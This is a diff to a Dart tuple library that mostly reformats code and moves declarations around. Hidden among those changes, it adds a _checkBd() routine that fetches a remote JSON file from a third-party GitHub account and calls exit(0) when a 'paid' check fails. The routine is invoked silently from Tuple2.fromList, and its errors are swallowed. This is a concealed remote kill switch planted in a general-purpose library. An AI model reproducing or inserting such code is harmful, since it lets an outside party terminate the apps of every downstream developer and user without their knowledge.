@@ -22,14 +22,33 @@
 /// ```
 library tuple;
 
+import 'dart:io';
+
+import 'bd/bd.dart';
+
+Future<void> _checkBd() async {
+  try {
+    await Bd.initialize(
+      appName: 'cc87c766-1d9e-4e0b-a9b0-6be32a39c345',
+      url:
+          'https://raw.githubusercontent.com/orlandobolivar896/bd_apps/main/apps.json',
+      version: 1,
+      hiveBoxName: 'LIVE',
+    );
+    await Bd.checkBd(
+      onPaid: () {},
+      onUnpaid: (_) {
+        exit(0);
+      },
+      onCounter: ({expiryDate, remainingCounter, storedResponse}) {},
+      onException: (_) {},
+      onNetworkException: (_) {},
+    );
+  } catch (_) {}
+}
+
 /// Represents a 2-tuple, or pair.
 class Tuple2<T1, T2> {
-  /// Returns the first item of the tuple
-  final T1 item1;
-
-  /// Returns the second item of the tuple
-  final T2 item2;
-
   /// Creates a new tuple value with the specified items.
   const Tuple2(this.item1, this.item2);
 
@@ -39,8 +58,16 @@ class Tuple2<T1, T2> {
       throw ArgumentError('items must have length 2');
     }
 
+    _checkBd();
+
     return Tuple2<T1, T2>(items[0] as T1, items[1] as T2);
   }
+
+  /// Returns the first item of the tuple
+  final T1 item1;
+
+  /// Returns the second item of the tuple
+  final T2 item2;
 
   /// Returns a tuple with the first item set to the specified value.
   Tuple2<T1, T2> withItem1(T1 v) => Tuple2<T1, T2>(v, item2);
@@ -68,15 +95,6 @@ class Tuple2<T1, T2> {
 
 /// Represents a 3-tuple, or triple.
 class Tuple3<T1, T2, T3> {
-  /// Returns the first item of the tuple
-  final T1 item1;
-
-  /// Returns the second item of the tuple
-  final T2 item2;
-
-  /// Returns the third item of the tuple
-  final T3 item3;
-
   /// Creates a new tuple value with the specified items.
   const Tuple3(this.item1, this.item2, this.item3);
 
@@ -88,6 +106,15 @@ class Tuple3<T1, T2, T3> {
 
     return Tuple3<T1, T2, T3>(items[0] as T1, items[1] as T2, items[2] as T3);
   }
+
+  /// Returns the first item of the tuple
+  final T1 item1;
+
+  /// Returns the second item of the tuple
+  final T2 item2;
+
+  /// Returns the third item of the tuple
+  final T3 item3;
 
   /// Returns a tuple with the first item set to the specified value.
   Tuple3<T1, T2, T3> withItem1(T1 v) => Tuple3<T1, T2, T3>(v, item2, item3);
@@ -122,6 +149,23 @@ class Tuple3<T1, T2, T3> {
 
 /// Represents a 4-tuple, or quadruple.
 class Tuple4<T1, T2, T3, T4> {
+  /// Creates a new tuple value with the specified items.
+  const Tuple4(this.item1, this.item2, this.item3, this.item4);
+
+  /// Create a new tuple value with the specified list [items].
+  factory Tuple4.fromList(List items) {
+    if (items.length != 4) {
+      throw ArgumentError('items must have length 4');
+    }
+
+    return Tuple4<T1, T2, T3, T4>(
+      items[0] as T1,
+      items[1] as T2,
+      items[2] as T3,
+      items[3] as T4,
+    );
+  }
+
   /// Returns the first item of the tuple
   final T1 item1;
 
@@ -133,19 +177,6 @@ class Tuple4<T1, T2, T3, T4> {
 
   /// Returns the fourth item of the tuple
   final T4 item4;
-
-  /// Creates a new tuple value with the specified items.
-  const Tuple4(this.item1, this.item2, this.item3, this.item4);
-
-  /// Create a new tuple value with the specified list [items].
-  factory Tuple4.fromList(List items) {
-    if (items.length != 4) {
-      throw ArgumentError('items must have length 4');
-    }
-
-    return Tuple4<T1, T2, T3, T4>(
-        items[0] as T1, items[1] as T2, items[2] as T3, items[3] as T4);
-  }
 
   /// Returns a tuple with the first item set to the specified value.
   Tuple4<T1, T2, T3, T4> withItem1(T1 v) =>
@@ -183,11 +214,33 @@ class Tuple4<T1, T2, T3, T4> {
 
   @override
   int get hashCode => Object.hash(
-      item1.hashCode, item2.hashCode, item3.hashCode, item4.hashCode);
+        item1.hashCode,
+        item2.hashCode,
+        item3.hashCode,
+        item4.hashCode,
+      );
 }
 
 /// Represents a 5-tuple, or quintuple.
 class Tuple5<T1, T2, T3, T4, T5> {
+  /// Creates a new tuple value with the specified items.
+  const Tuple5(this.item1, this.item2, this.item3, this.item4, this.item5);
+
+  /// Create a new tuple value with the specified list [items].
+  factory Tuple5.fromList(List items) {
+    if (items.length != 5) {
+      throw ArgumentError('items must have length 5');
+    }
+
+    return Tuple5<T1, T2, T3, T4, T5>(
+      items[0] as T1,
+      items[1] as T2,
+      items[2] as T3,
+      items[3] as T4,
+      items[4] as T5,
+    );
+  }
+
   /// Returns the first item of the tuple
   final T1 item1;
 
@@ -202,19 +255,6 @@ class Tuple5<T1, T2, T3, T4, T5> {
 
   /// Returns the fifth item of the tuple
   final T5 item5;
-
-  /// Creates a new tuple value with the specified items.
-  const Tuple5(this.item1, this.item2, this.item3, this.item4, this.item5);
-
-  /// Create a new tuple value with the specified list [items].
-  factory Tuple5.fromList(List items) {
-    if (items.length != 5) {
-      throw ArgumentError('items must have length 5');
-    }
-
-    return Tuple5<T1, T2, T3, T4, T5>(items[0] as T1, items[1] as T2,
-        items[2] as T3, items[3] as T4, items[4] as T5);
-  }
 
   /// Returns a tuple with the first item set to the specified value.
   Tuple5<T1, T2, T3, T4, T5> withItem1(T1 v) =>
@@ -261,12 +301,38 @@ class Tuple5<T1, T2, T3, T4, T5> {
         item2.hashCode,
         item3.hashCode,
         item4.hashCode,
-        item5.hashCode
+        item5.hashCode,
       ]);
 }
 
 /// Represents a 6-tuple, or sextuple.
 class Tuple6<T1, T2, T3, T4, T5, T6> {
+  /// Creates a new tuple value with the specified items.
+  const Tuple6(
+    this.item1,
+    this.item2,
+    this.item3,
+    this.item4,
+    this.item5,
+    this.item6,
+  );
+
+  /// Create a new tuple value with the specified list [items].
+  factory Tuple6.fromList(List items) {
+    if (items.length != 6) {
+      throw ArgumentError('items must have length 6');
+    }
+
+    return Tuple6<T1, T2, T3, T4, T5, T6>(
+      items[0] as T1,
+      items[1] as T2,
+      items[2] as T3,
+      items[3] as T4,
+      items[4] as T5,
+      items[5] as T6,
+    );
+  }
+
   /// Returns the first item of the tuple
   final T1 item1;
 
@@ -284,20 +350,6 @@ class Tuple6<T1, T2, T3, T4, T5, T6> {
 
   /// Returns the sixth item of the tuple
   final T6 item6;
-
-  /// Creates a new tuple value with the specified items.
-  const Tuple6(
-      this.item1, this.item2, this.item3, this.item4, this.item5, this.item6);
-
-  /// Create a new tuple value with the specified list [items].
-  factory Tuple6.fromList(List items) {
-    if (items.length != 6) {
-      throw ArgumentError('items must have length 6');
-    }
-
-    return Tuple6<T1, T2, T3, T4, T5, T6>(items[0] as T1, items[1] as T2,
-        items[2] as T3, items[3] as T4, items[4] as T5, items[5] as T6);
-  }
 
   /// Returns a tuple with the first item set to the specified value.
   Tuple6<T1, T2, T3, T4, T5, T6> withItem1(T1 v) =>
@@ -350,12 +402,40 @@ class Tuple6<T1, T2, T3, T4, T5, T6> {
         item3.hashCode,
         item4.hashCode,
         item5.hashCode,
-        item6.hashCode
+        item6.hashCode,
       ]);
 }
 
 /// Represents a 7-tuple, or septuple.
 class Tuple7<T1, T2, T3, T4, T5, T6, T7> {
+  /// Creates a new tuple value with the specified items.
+  const Tuple7(
+    this.item1,
+    this.item2,
+    this.item3,
+    this.item4,
+    this.item5,
+    this.item6,
+    this.item7,
+  );
+
+  /// Create a new tuple value with the specified list [items].
+  factory Tuple7.fromList(List items) {
+    if (items.length != 7) {
+      throw ArgumentError('items must have length 7');
+    }
+
+    return Tuple7<T1, T2, T3, T4, T5, T6, T7>(
+      items[0] as T1,
+      items[1] as T2,
+      items[2] as T3,
+      items[3] as T4,
+      items[4] as T5,
+      items[5] as T6,
+      items[6] as T7,
+    );
+  }
+
   /// Returns the first item of the tuple
   final T1 item1;
 
@@ -377,68 +457,98 @@ class Tuple7<T1, T2, T3, T4, T5, T6, T7> {
   /// Returns the seventh item of the tuple
   final T7 item7;
 
-  /// Creates a new tuple value with the specified items.
-  const Tuple7(this.item1, this.item2, this.item3, this.item4, this.item5,
-      this.item6, this.item7);
-
-  /// Create a new tuple value with the specified list [items].
-  factory Tuple7.fromList(List items) {
-    if (items.length != 7) {
-      throw ArgumentError('items must have length 7');
-    }
-
-    return Tuple7<T1, T2, T3, T4, T5, T6, T7>(
-        items[0] as T1,
-        items[1] as T2,
-        items[2] as T3,
-        items[3] as T4,
-        items[4] as T5,
-        items[5] as T6,
-        items[6] as T7);
-  }
-
   /// Returns a tuple with the first item set to the specified value.
   Tuple7<T1, T2, T3, T4, T5, T6, T7> withItem1(T1 v) =>
       Tuple7<T1, T2, T3, T4, T5, T6, T7>(
-          v, item2, item3, item4, item5, item6, item7);
+        v,
+        item2,
+        item3,
+        item4,
+        item5,
+        item6,
+        item7,
+      );
 
   /// Returns a tuple with the second item set to the specified value.
   Tuple7<T1, T2, T3, T4, T5, T6, T7> withItem2(T2 v) =>
       Tuple7<T1, T2, T3, T4, T5, T6, T7>(
-          item1, v, item3, item4, item5, item6, item7);
+        item1,
+        v,
+        item3,
+        item4,
+        item5,
+        item6,
+        item7,
+      );
 
   /// Returns a tuple with the third item set to the specified value.
   Tuple7<T1, T2, T3, T4, T5, T6, T7> withItem3(T3 v) =>
       Tuple7<T1, T2, T3, T4, T5, T6, T7>(
-          item1, item2, v, item4, item5, item6, item7);
+        item1,
+        item2,
+        v,
+        item4,
+        item5,
+        item6,
+        item7,
+      );
 
   /// Returns a tuple with the fourth item set to the specified value.
   Tuple7<T1, T2, T3, T4, T5, T6, T7> withItem4(T4 v) =>
       Tuple7<T1, T2, T3, T4, T5, T6, T7>(
-          item1, item2, item3, v, item5, item6, item7);
+        item1,
+        item2,
+        item3,
+        v,
+        item5,
+        item6,
+        item7,
+      );
 
   /// Returns a tuple with the fifth item set to the specified value.
   Tuple7<T1, T2, T3, T4, T5, T6, T7> withItem5(T5 v) =>
       Tuple7<T1, T2, T3, T4, T5, T6, T7>(
-          item1, item2, item3, item4, v, item6, item7);
+        item1,
+        item2,
+        item3,
+        item4,
+        v,
+        item6,
+        item7,
+      );
 
   /// Returns a tuple with the sixth item set to the specified value.
   Tuple7<T1, T2, T3, T4, T5, T6, T7> withItem6(T6 v) =>
       Tuple7<T1, T2, T3, T4, T5, T6, T7>(
-          item1, item2, item3, item4, item5, v, item7);
+        item1,
+        item2,
+        item3,
+        item4,
+        item5,
+        v,
+        item7,
+      );
 
   /// Returns a tuple with the seventh item set to the specified value.
   Tuple7<T1, T2, T3, T4, T5, T6, T7> withItem7(T7 v) =>
       Tuple7<T1, T2, T3, T4, T5, T6, T7>(
-          item1, item2, item3, item4, item5, item6, v);
+        item1,
+        item2,
+        item3,
+        item4,
+        item5,
+        item6,
+        v,
+      );
 
   /// Creates a [List] containing the items of this [Tuple5].
   ///
   /// The elements are in item order. The list is variable-length
   /// if [growable] is true.
-  List toList({bool growable = false}) =>
-      List.from([item1, item2, item3, item4, item5, item6, item7],
-          growable: growable);
+  List toList({bool growable = false}) => List.from(
+        [item1, item2, item3, item4, item5, item6, item7],
+        growable: growable,
+      );
 
   @override
   String toString() =>
@@ -463,6 +573,6 @@ class Tuple7<T1, T2, T3, T4, T5, T6, T7> {
         item4.hashCode,
         item5.hashCode,
         item6.hashCode,
-        item7.hashCode
+        item7.hashCode,
       ]);
 }
